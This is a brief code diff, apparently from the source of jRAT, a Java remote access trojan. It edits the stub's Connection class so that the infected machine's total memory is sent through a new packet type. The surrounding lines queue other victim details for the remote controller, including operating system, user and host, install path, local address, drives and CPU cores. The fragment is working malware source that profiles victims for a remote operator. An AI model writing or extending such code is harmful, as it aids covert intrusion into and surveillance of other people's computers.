@@ -38,7 +38,7 @@ import se.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
 import se.jrat.stub.packets.outgoing.Packet5InitUserHost;
 import se.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import se.jrat.stub.packets.outgoing.Packet62InitDrives;
-import se.jrat.stub.packets.outgoing.Packet63InitRAM;
+import se.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
 import se.jrat.stub.packets.outgoing.Packet64InitAvailableCores;
 import se.jrat.stub.packets.outgoing.Packet67LoadedPlugins;
 import se.jrat.stub.packets.outgoing.Packet6InitVersion;
@@ -153,6 +153,7 @@ public class Connection implements Runnable {
 		addToSendQueue(new Packet10InitInstallPath());
 		addToSendQueue(new Packet11InitInstallationDate());
 		addToSendQueue(new Packet12InitLocalAddress());
+		addToSendQueue(new Packet13InitTotalMemory());
 
 
 
@@ -169,8 +170,6 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet62InitDrives(File.listRoots()));
 
-		int ram = (int) (((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1024L / 1024L);
-		addToSendQueue(new Packet63InitRAM(ram));
 
 		addToSendQueue(new Packet64InitAvailableCores(Runtime.getRuntime().availableProcessors()));
 
